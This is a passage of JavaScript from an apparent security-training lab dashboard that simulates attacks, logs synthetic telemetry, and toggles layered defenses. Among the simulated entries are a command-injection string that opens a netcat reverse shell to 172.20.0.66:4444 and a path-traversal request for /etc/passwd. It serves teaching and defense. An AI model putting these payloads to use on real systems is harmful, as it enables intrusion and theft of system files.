      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
    };
  } else if (type === 'reverse-shell') {
    const shellCmd = 'nc -e /bin/sh 172.20.0.66 4444';
    const blockedAtL3 = l3SanitizerOn;
    const blockedAtL2 = !l3SanitizerOn && l2On;
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'GET',
      endpoint: `/api/system/network-ping?host=127.0.0.1;${encodeURIComponent(shellCmd)}`,
      status_code: blockedAtL3 ? 400 : blockedAtL2 ? 403 : 200,
      response_time: Math.floor(Math.random() * 40) + 18,
      client_ip: '172.20.0.66',
      payload_summary: {
        query: { host: `127.0.0.1; ${shellCmd}` },
        shell_cmd: shellCmd,
        defense_layer: blockedAtL3
          ? 'BLOCKED_AT_L3_INPUT_SANITIZER'
          : blockedAtL2
            ? 'BLOCKED_AT_L2_OS_NOLOGIN_CGROUPS'
            : 'COMPROMISED_REVERSE_SHELL_ACTIVE',
        detected_patterns: ['OS_COMMAND_INJECTION', 'REVERSE_SHELL_SPAWN'],
      },
      attack_tag: 'COMMAND_INJECTION',
      is_suspicious: true,
      defense_action: blockedAtL3 ? 'sanitized' : blockedAtL2 ? 'blocked' : 'allowed',
    };
  } else if (type === 'fd-exhaust') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'POST',
      endpoint: '/OS/fd-exhaustion (ulimit/lsof saturation & fork bomb)',
      status_code: l2On ? 403 : 503,
      response_time: l2On ? 15 : 310,
      client_ip: '172.20.0.66',
      payload_summary: {
        open_fds: l2On ? 164 : 968,
        max_fds: l2On ? 512 : 1024,
        l2_os_limits: l2On ? 'CONTAINED (ulimit -n 512, cgroups pids.max=50)' : 'UNLIMITED (EMFILE EXHAUSTED)',
        detected_patterns: ['EMFILE_TOO_MANY_OPEN_FILES', 'FD_TABLE_EXHAUSTION'],
      },
      attack_tag: 'FD_EXHAUSTION',
      is_suspicious: true,
      defense_action: l2On ? 'blocked' : 'monitored',
    };
  } else if (type === 'path-traversal') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'GET',
      endpoint: '/api/files/download?name=../../../../etc/passwd',
      status_code: l3SanitizerOn ? 400 : 200,
      response_time: Math.floor(Math.random() * 20) + 7,
      client_ip: '172.20.0.66',
      payload_summary: {
        query: { name: '../../../../etc/passwd' },
        target_file: '/etc/passwd',
        detected_patterns: ['DOT_DOT_SLASH_PATH_TRAVERSAL'],
      },
      attack_tag: 'PATH_TRAVERSAL',
      is_suspicious: true,
      defense_action: l3SanitizerOn ? 'blocked' : 'allowed',
    };
  } else if (type === 'dos') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'GET',
      endpoint: '/api/heavy-load?iterations=500000',
      status_code: l3RateLimitOn ? 429 : 200,
      response_time: l3RateLimitOn ? 5 : Math.floor(Math.random() * 300) + 150,
      client_ip: '192.168.1.200',
      payload_summary: {
        query: { iterations: 500000 },
        cross_layer_note: l1On ? 'Bypassed L1 SYN Filter (Single TCP connection) -> Blocked at L3 Rate Limiter' : 'Heavy CPU load',
      },
      attack_tag: 'HEAVY_DOS',
      is_suspicious: true,
      defense_action: l3RateLimitOn ? 'rate_limited' : 'allowed',
    };
  }

  if (logPayload) {
    logPayload.metadata = { source: 'demo', synthetic: true };
    logPayload.endpoint = '[DEMO] ' + logPayload.endpoint;
    try {
      await fetch('/api/telemetry', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logPayload),
      });
    } catch (e) {
      // Fallback local visual
      handleIncomingTelemetry(logPayload);
    }
  }
}

// Utility Helpers
function truncate(str, max) {
  if (!str) return '';
  return str.length > max ? str.substring(0, max) + '...' : str;
}

function escapeHtml(str) {
  return String(str ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ==========================================
// 8. W6-T1 & W6-ALL: 1-TOUCH LAB RESET, KILL CHAIN 5-STAGE STEPPER & SYN FLOOD STRESS BURST
// ==========================================
function updateKillChainUI(kcState) {
  if (!kcState || !Array.isArray(kcState.stages)) return;
  state.killChain = {
    ...state.killChain,
    ...kcState,
  };

  const badge = document.getElementById('killchain-status-badge');
  let compromisedCount = 0;
  let blockedCount = 0;

  for (const s of state.killChain.stages) {
    const stageEl = document.getElementById(`kc-stage-${s.stage}`);
    const pillEl = document.getElementById(`kc-pill-${s.stage}`);
    if (!stageEl || !pillEl) continue;

    stageEl.classList.remove('kc-running', 'kc-compromised', 'kc-blocked');
    if (s.state === 'RUNNING') {
      stageEl.classList.add('kc-running');
      pillEl.textContent = '⏳ RUNNING';
    } else if (s.state === 'COMPROMISED') {
      compromisedCount += 1;
      stageEl.classList.add('kc-compromised');
      pillEl.textContent = '💥 COMPROMISED';
    } else if (s.state === 'BLOCKED') {
      blockedCount += 1;
      stageEl.classList.add('kc-blocked');
      pillEl.textContent = `🛡️ BLOCKED (${s.blocked_by ? s.blocked_by.split('_')[0] : 'SHIELD'})`;
    } else {
      pillEl.textContent = 'IDLE';
    }
  }

  if (badge) {
    if (compromisedCount > 0 && blockedCount === 0) {
      badge.className = 'badge badge-attack';
      badge.textContent = `🔥 KILL CHAIN: ${compromisedCount}/5 STAGES EXPLOITED`;
    } else if (blockedCount > 0 && compromisedCount === 0) {
      badge.className = 'badge badge-shield';
      badge.textContent = `🛡️ KILL CHAIN: ${blockedCount}/5 STAGES MITIGATED`;
    } else if (compromisedCount > 0 || blockedCount > 0) {
      badge.className = 'badge badge-mitm';
      badge.textContent = `⚡ KILL CHAIN: ${blockedCount} BLOCKED / ${compromisedCount} EXPLOITED`;
    } else {
      badge.className = 'badge badge-normal';
      badge.textContent = 'KILL CHAIN: STANDBY';
    }
  }
}

async function executeKillChainStage(stageId) {
  const stageEl = document.getElementById(`kc-stage-${stageId}`);
  const pillEl = document.getElementById(`kc-pill-${stageId}`);
  if (stageEl) {
    stageEl.classList.remove('kc-compromised', 'kc-blocked');
    stageEl.classList.add('kc-running');
  }
  if (pillEl) pillEl.textContent = '⏳ RUNNING';

  if (stageId === 1) {
    await simulateTraffic('arp-spoof');
    await simulateTraffic('normal-login');
  } else if (stageId === 2) {
    await simulateTraffic('brute-force');
    await simulateTraffic('sqli');
  } else if (stageId === 3) {
    await simulateTraffic('reverse-shell');
  } else if (stageId === 4) {
    await simulateTraffic('path-traversal');
  } else if (stageId === 5) {
    await simulateTraffic('syn-flood');
    await simulateTraffic('fd-exhaust');
    await simulateTraffic('rst-inject');
  }
}

async function runAutoKillChain() {
  if (state.killChain.autoPlaying) return;
  state.killChain.autoPlaying = true;
  const playBtn = document.getElementById('btn-run-killchain');
  if (playBtn) {
    playBtn.disabled = true;
    playBtn.textContent = '⏳ EXECUTING 5-STAGE KILL CHAIN...';
  }
  try {
    await fetch('/api/killchain/reset', { method: 'POST' }).catch(() => {});
    for (let stageId = 1; stageId <= 5; stageId++) {
      await executeKillChainStage(stageId);
      await new Promise((r) => setTimeout(r, 650));
    }
  } finally {
    state.killChain.autoPlaying = false;
    if (playBtn) {
      playBtn.disabled = false;
      playBtn.textContent = '▶ AUTO-PLAY KILL CHAIN (5 STAGES)';
    }
  }
}

async function enableAllThreeShields() {
  const btn = document.getElementById('btn-enable-all-shields');
  if (btn) btn.disabled = true;
  try {
    await Promise.all([
      fetch('/api/defense/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ layer: 'l1', enabled: true }),
      }),
      fetch('/api/defense/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ layer: 'l2', enabled: true }),
      }),
      fetch('/api/defense/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ layer: 'l3', enabled: true }),
      }),
    ]);
  } finally {
    if (btn) btn.disabled = false;
  }
}

/**
 * W6-T1: Bắn bão 120 gói SYN Flood liên hoàn để kiểm chứng rAF Event Batching & Particle Cap giữ UI mượt 60 FPS
 */
async function runSynFloodStressBurst(count = 120) {
  const btn = document.getElementById('btn-stress-syn-burst');
  if (btn) {
    btn.disabled = true;
    btn.textContent = `🌊 FLOODING ${count} SYN PKTS...`;
  }
  try {
    const l1On = Boolean(state.defenseL1Active);
    const l2On = Boolean(state.defenseL2Active);
    const batchPromises = [];
    for (let i = 0; i < count; i++) {
      const payload = {
        timestamp: new Date().toISOString(),
        method: 'TCP',
        endpoint: `[DEMO] /L4/tcp-syn-flood-burst#${i + 1} (Flags: SYN, Port: 8000, Burst: ${count} pps)`,
        status_code: l1On ? 429 : l2On ? 200 : 503,
        response_time: l1On ? 2 : l2On ? 12 : 340,
        client_ip: '172.20.0.66',
        payload_summary: {
          burst_index: i + 1,
          total_burst: count,
          pps: count,
          backlog_queue: l1On
            ? 'L1_IPTABLES_SYN_LIMIT_DROPPED'
            : l2On
              ? 'L2_TCP_SYNCOOKIES_MITIGATED'
              : 'SYN_RECV_OVERFLOW',
        },
        attack_tag: 'SYN_FLOOD',
        is_suspicious: true,
        defense_action: l1On ? 'rate_limited' : l2On ? 'blocked' : 'monitored',
        metadata: { source: 'demo', synthetic: true, burst: true },
      };
      batchPromises.push(
        fetch('/api/telemetry', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        }).catch(() => enqueueTelemetryUpdate({ log: payload })),
      );
      if (batchPromises.length >= 20) {
        await Promise.all(batchPromises.splice(0, batchPromises.length));
      }
    }
    if (batchPromises.length > 0) {
      await Promise.all(batchPromises);
    }
  } finally {
    if (btn) {
      btn.disabled = false;
      btn.textContent = '🌊 STRESS TEST SYN BURST (120 PKTS)';
    }
  }
}

/**
 * W6-T1: Nút bấm "Reset Lab 1-Chạm" (1-Touch Clean State Reset)
 */
async function triggerOneTouchLabReset() {
  const btn = document.getElementById('btn-reset-state');
  if (btn) {
    btn.disabled = true;
    btn.textContent = '⏳ RESETTING LAB...';
  }
  try {
    const res = await fetch('/api/lab/reset', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({}),
    });
    const data = await res.json();
    if (res.ok && data.reset_summary) {
      showResetToastBanner(data.reset_summary, data.message);
    }
  } catch {
    fetch('/api/telemetry/clear', { method: 'DELETE' }).catch(() => {});
  } finally {
    if (btn) {
      btn.disabled = false;
      btn.innerHTML = '<span class="btn-glow"></span>⚡ RESET LAB 1-CHẠM';
    }
  }
}

function showResetToastBanner(summary, message) {
  const banner = document.getElementById('reset-toast-banner');
  const titleEl = document.getElementById('reset-toast-title');
  const detailsEl = document.getElementById('reset-toast-details');
  if (!banner) return;

  const elapsed = summary && typeof summary.elapsed_ms === 'number' ? summary.elapsed_ms : 15;
  const slaLabel = elapsed <= 3000 ? `PASS (<3s SLA: ${elapsed}ms)` : `${elapsed}ms`;
  const targetDbStatus = summary && summary.target_app_reset ? 'Target SQLite & RateLimit Reset' : 'Hub State Reset';

  if (titleEl) {
    titleEl.textContent = `⚡ 1-TOUCH LAB RESET COMPLETED · ${slaLabel}`;
  }
  if (detailsEl) {
    detailsEl.textContent =
      message ||
      `Đã khôi phục: Bảng ARP sạch | Ngắt Reverse Shell & lsof FD (42/1024) | ${targetDbStatus} | Đặt lại 3 Lớp Khiên & Xóa Ring Buffer.`;
  }
  banner.classList.remove('hidden');

  if (state.resetToastTimer) clearTimeout(state.resetToastTimer);
  state.resetToastTimer = setTimeout(() => {
    banner.classList.add('hidden');
  }, 8000);
}
